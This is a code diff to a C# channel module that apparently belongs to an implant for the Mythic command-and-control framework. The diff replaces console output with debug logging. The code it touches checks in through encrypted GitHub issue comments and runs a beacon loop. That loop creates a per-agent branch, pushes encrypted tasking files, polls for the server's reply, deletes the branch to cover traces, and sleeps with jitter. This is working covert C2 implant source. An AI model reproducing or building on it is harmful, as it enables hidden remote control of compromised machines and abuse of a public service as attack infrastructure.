@@ -51,17 +51,17 @@ namespace Workflow.Channels
 
             var tokenAuth = new Credentials(githubToken);
             client.Credentials = tokenAuth;
+            DebugLog.Log("GitHub config loaded");
         }
 
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
             // Post Checkin
-            Console.WriteLine($"Checkin UUID: {agentConfig.uuid}");
+            DebugLog.Log("GitHub sending checkin");
 
             // Send Checkin
             string msg = JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin);
             string checkin_msg = this.crypt.Encrypt(msg);
-            //Console.WriteLine(checkin_msg);
             try
             {
                 var createdComment = await client.Issue.Comment.Create(owner, repo, clientIssue, checkin_msg);
@@ -69,7 +69,7 @@ namespace Workflow.Channels
             }
             catch (Exception e)
             {
-                Console.WriteLine($"Error: {e.Message}");
+                DebugLog.Log($"GitHub checkin error: {e.Message}");
             }
 
             // Retrieve Checkin Response (cir)
@@ -84,10 +84,12 @@ namespace Workflow.Channels
                 // there should only be one valid comment returned since it's the checkin response
                 if (comments.Count == 1)
                 {
+                    DebugLog.Log("GitHub checkin response received");
                     this.checkedin = true;
                     this.cir = JsonSerializer.Deserialize<CheckinResponse>(comments[0]);
                     return this.cir;
                 }
+                DebugLog.Log($"GitHub waiting for checkin response, attempt {currentAttempt + 1}/{maxAttempts}");
                 currentAttempt++;
             } while (currentAttempt <= maxAttempts);
             
@@ -100,37 +102,36 @@ namespace Workflow.Channels
         public async Task StartBeacon()
         {
             //Main beacon loop handled here
-            Console.WriteLine($"Start beacon UUID: {agentConfig.uuid}");
+            DebugLog.Log("GitHub beacon starting");
 
             this.cancellationTokenSource = new CancellationTokenSource();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
                 // Create new branch
-                Console.WriteLine("Creating branch");
+                DebugLog.Log("GitHub creating branch");
                 var baseRef = await client.Git.Reference.Get(owner, repo, $"heads/main");
                 var newBranchRef = new NewReference($"refs/heads/{agentConfig.uuid}", baseRef.Object.Sha);
                 var createdRef = await client.Git.Reference.Create(owner, repo, newBranchRef);
                 string firstCommitHash = createdRef.Object.Sha;
 
-                Console.WriteLine("Checking In");
+                DebugLog.Log("GitHub pushing message to repo");
                 // Push get_tasking message to repo for server to retrieve
                 string agentSha = "";
                 try
                 {
                     string message = this.crypt.Encrypt(messageManager.GetAgentResponseString());
-                    Console.WriteLine("Message to Mythic!");
-                    Console.WriteLine(message);
+                    DebugLog.Log($"GitHub encrypted message ({message.Length} bytes)");
                     var createRequest = new CreateFileRequest(agentConfig.uuid, message, agentConfig.uuid);
                     var result = await client.Repository.Content.CreateFile(owner, repo, "server.txt", createRequest);
                     agentSha = result.Commit.Sha;
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine($"{e.Message}");
+                    DebugLog.Log($"GitHub push error: {e.Message}");
                 }
 
                 // Wait for Mythic to push response back to GitHub repo
-                Console.WriteLine("Waiting for Mythic to push back");
+                DebugLog.Log("GitHub waiting for response");
                 int maxAttempts = 3;
                 int currentAttempt = 0;
                 bool isSuccessful = false;
@@ -147,23 +148,23 @@ namespace Workflow.Channels
                     }
                     catch (NotFoundException)
                     {
-                        Console.WriteLine($"Mythic has not pushed client.txt yet");
+                        DebugLog.Log("GitHub response not available yet");
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine($"An error occurred: {ex.Message}");
+                        DebugLog.Log($"GitHub poll error: {ex.Message}");
                     }
                     currentAttempt++;
                 }
                 while (!isSuccessful && currentAttempt < maxAttempts);
 
                 // Retrieve get_tasking response from repo
-                Console.WriteLine("Getting response back from Mythic");
+                DebugLog.Log("GitHub retrieving response");
                 try
                 {
                     var fileContents = await client.Repository.Content.GetAllContentsByRef(owner, repo, "client.txt", agentConfig.uuid);
                     string mythResp = this.crypt.Decrypt(fileContents[0].Content);
-                    Console.WriteLine(mythResp);
+                    DebugLog.Log("GitHub response retrieved and decrypted");
                     GetTaskingResponse gtr = JsonSerializer.Deserialize(mythResp, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                     if (gtr != null)
                     {
@@ -173,11 +174,11 @@ namespace Workflow.Channels
                 }
                 catch (NotFoundException)
                 {
-                    Console.WriteLine($"File 'client.txt' not found in repository '{repo}' on branch '{agentConfig.uuid}'.");
+                    DebugLog.Log("GitHub client.txt not found in branch");
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine($"Error: {ex.Message}");
+                    DebugLog.Log($"GitHub retrieve error: {ex.Message}");
                 }
 
                 if (this.currentAttempt >= this.maxAttempts)
@@ -186,16 +187,16 @@ namespace Workflow.Channels
                 }
 
                 // Delete branch
-                Console.WriteLine("Deleting branch");
+                DebugLog.Log("GitHub deleting branch");
                 try
                 {
                     // Delete the branch
                     await client.Git.Reference.Delete(owner, repo, $"refs/heads/{agentConfig.uuid}");
-                    Console.WriteLine($"Branch '{agentConfig.uuid}' deleted successfully.");
+                    DebugLog.Log("GitHub branch deleted");
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine($"An error occurred while deleting the branch: {ex.Message}");
+                    DebugLog.Log($"GitHub branch delete error: {ex.Message}");
                 }
                 // Rest
                 await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
@@ -216,6 +217,7 @@ namespace Workflow.Channels
             try
             {
                 var all_comments = await client.Issue.Comment.GetAllForIssue(owner, repo, serverIssue);
+                DebugLog.Log($"GitHub GetComments found {all_comments.Count} comments");
                 foreach (var comment in all_comments)
                 {
                     // check if message is for us
@@ -223,6 +225,7 @@ namespace Workflow.Channels
                     var payloadUuid = msg.Substring(0, 36);
                     if (payloadUuid == agentConfig.uuid)
                     {
+                        DebugLog.Log("GitHub comment matched our UUID");
                         comments.Add(this.crypt.Decrypt(comment.Body));
                         //delete comment
                         try
@@ -231,14 +234,14 @@ namespace Workflow.Channels
                         }
                         catch (Exception e)
                         {
-                            Console.WriteLine($"Error: {e.Message}");
+                            DebugLog.Log($"GitHub error: {e.Message}");
                         }
                     }
                 }
             }
             catch (Exception e )
             {
-                Console.WriteLine($"Error: {e.Message}");
+                DebugLog.Log($"GitHub error: {e.Message}");
             }
             return comments;
         }
